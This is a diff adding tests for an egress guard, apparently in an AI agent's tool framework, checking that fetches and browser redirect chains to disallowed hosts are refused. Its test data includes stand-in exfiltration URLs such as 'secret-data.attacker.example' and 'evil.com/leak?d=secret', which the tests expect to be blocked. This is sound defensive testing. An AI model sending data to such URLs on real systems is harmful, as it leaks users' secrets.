@@ -127,6 +127,15 @@ describe('fetchGuarded under the egress policy', () => {
     await expect(asTool(() => fetchGuarded('http://127.0.0.1/'))).rejects.toThrow(/SSRF guard/);
   });
 
+  test('under a deny default an unlisted name is refused before it is resolved (no DNS exfiltration)', async () => {
+    state.policy = egressPolicySchema.parse({ default: 'deny', rules: [{ action: 'allow', host: 'docs.example' }] });
+    const resolve4 = vi.mocked(dns.promises.resolve4);
+    resolve4.mockClear();
+    await expect(asTool(() => fetchGuarded('https://secret-data.attacker.example/'))).rejects.toThrow(/default \(deny\)/);
+    expect(resolve4).not.toHaveBeenCalled();
+    expect(state.contacted).toEqual([]);
+  });
+
   test('traffic outside a tool call (providers, webhooks) is not judged by the tool policy', async () => {
     state.policy = egressPolicySchema.parse({ default: 'deny' });
     await expect(fetchGuarded('https://api.provider.example/v1/models')).resolves.toBeDefined();
@@ -142,11 +151,26 @@ describe('browser navigations (Playwright cannot be pinned)', () => {
     return { request: () => request as never, serverAddr: async () => ({ ipAddress: ip }) };
   };
 
+  const resolveHop = async (host: string) => (host === 'evil.com' ? ['203.0.113.50'] : [PUBLIC]);
+  const subject = { tool: 'browser' };
+
   test('every redirect hop and the serving address are judged', async () => {
     state.policy = egressPolicySchema.parse({ rules: [{ action: 'deny', host: 'hop.example' }, { action: 'deny', cidr: '203.0.113.0/24' }] });
-    await expect(asTool(() => assertBrowserNavigationAllowed(navigation(['https://a.example/', 'https://b.example/'], PUBLIC)))).resolves.toBeUndefined();
-    await expect(asTool(() => assertBrowserNavigationAllowed(navigation(['https://a.example/', 'https://HOP.example./x', 'https://b.example/'], PUBLIC)))).rejects.toThrow(/hop\.example:443/);
-    await expect(asTool(() => assertBrowserNavigationAllowed(navigation(['https://a.example/'], '203.0.113.9')))).rejects.toThrow(/deny 203\.0\.113\.0\/24/);
+    await expect(assertBrowserNavigationAllowed(navigation(['https://a.example/', 'https://b.example/'], PUBLIC), subject, resolveHop)).resolves.toBeUndefined();
+    await expect(assertBrowserNavigationAllowed(navigation(['https://a.example/', 'https://HOP.example./x', 'https://b.example/'], PUBLIC), subject, resolveHop)).rejects.toThrow(/hop\.example:443/);
+    await expect(assertBrowserNavigationAllowed(navigation(['https://a.example/'], '203.0.113.9'), subject, resolveHop)).rejects.toThrow(/deny 203\.0\.113\.0\/24/);
+  });
+
+  test('a middle hop is judged with its addresses and the default, not by name alone', async () => {
+    // The reviewer's chain: good.com → evil.com/leak → good.com under a deny default.
+    state.policy = egressPolicySchema.parse({ default: 'deny', rules: [{ action: 'allow', host: 'good.com' }] });
+    const chain = ['https://good.com/r', 'https://evil.com/leak?d=secret', 'https://good.com/final'];
+    await expect(assertBrowserNavigationAllowed(navigation(chain, PUBLIC), subject, resolveHop)).rejects.toThrow(/evil\.com:443 .* default \(deny\)/);
+    // An address deny on a middle hop applies even when its name is allowed.
+    state.policy = egressPolicySchema.parse({ rules: [{ action: 'allow', host: 'evil.com' }, { action: 'deny', cidr: '203.0.113.0/24' }] });
+    await expect(assertBrowserNavigationAllowed(navigation(chain, PUBLIC), subject, resolveHop)).rejects.toThrow(/deny 203\.0\.113\.0\/24/);
+    // A hop that no longer resolves cannot be cleared by an address rule: refused.
+    await expect(assertBrowserNavigationAllowed(navigation(chain, PUBLIC), subject, async () => { throw new Error('NXDOMAIN'); })).rejects.toThrow(/addresses are not known/);
   });
 
   test('no policy: the navigation is not even inspected', async () => {
